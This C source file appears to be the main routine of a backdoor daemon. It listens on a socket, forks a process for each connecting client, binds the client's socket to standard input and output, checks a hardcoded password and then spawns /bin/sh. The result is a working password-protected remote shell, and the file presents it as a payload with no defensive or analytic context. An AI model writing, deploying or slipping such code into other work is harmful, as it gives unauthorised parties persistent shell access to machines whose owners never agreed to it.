#include "payload.h"
#include <string.h>

int main(void) {
	int	  listener;
	int	  client;
	pid_t pid;
	char  password[] = "xXgsaiagoXx";

	listener = create_listener();
	if (listener < 0) {
		sd_notifyf(0, "STOPPING=1\nEXIT_STATUS=1\nERRNO=%d", errno);
		return (1);
	}
	if (install_sigchld_handler() != 0) {
		Err("Failed accept new client");
		sd_notifyf(0, "STOPPING=1\nEXIT_STATUS=1\nERRNO=%d", errno);
		return (1);
	}
	while (42) {
		client = accept(listener, NULL, NULL);
		if (client < 0) {
			Err("Failed to accept new client");
			sd_notifyf(0, "STOPPING=1\nEXIT_STATUS=1\nERRNO=%d", errno);
			return (1);
		}
		if (client_buffer_has_seat() != 0) {
			Debug("The buffer has no seats available, refusing new client");
			close(client);
			continue;
		}

		pid = fork();
		if (pid < 0) {
			Err("Failed accept new client");
			sd_notifyf(0, "STOPPING=1\nEXIT_STATUS=1\nERRNO=%d", errno);
			return (1);
		}
		if (pid == 0) {
			char password_buff[20] = {0};
			Debug("Starting new client");
			dup2(client, STDIN_FILENO);
			dup2(client, STDOUT_FILENO);
			dup2(client, STDERR_FILENO);
			if (read_with_timeout(client, password_buff,
								  sizeof(password_buff) - 1, 10) <= 0) {
				Warn("client timed out after 10 seconds on password");
				close(client);
				return (-1);
			}
			if (strncmp(password_buff, password, sizeof(password) - 1) != 0) {
				Warn("client inputted wrong password");
				write(client, "wrong password\n", 16);
				close(client);
				return (-1);
			}
			if (execl("/bin/sh", "sh", NULL) != -1) {
				Err("execl failed");
			}
		}
		client_buffer_acquire_seat(pid);
		close(client); // avoid leak on parent process
	}
}
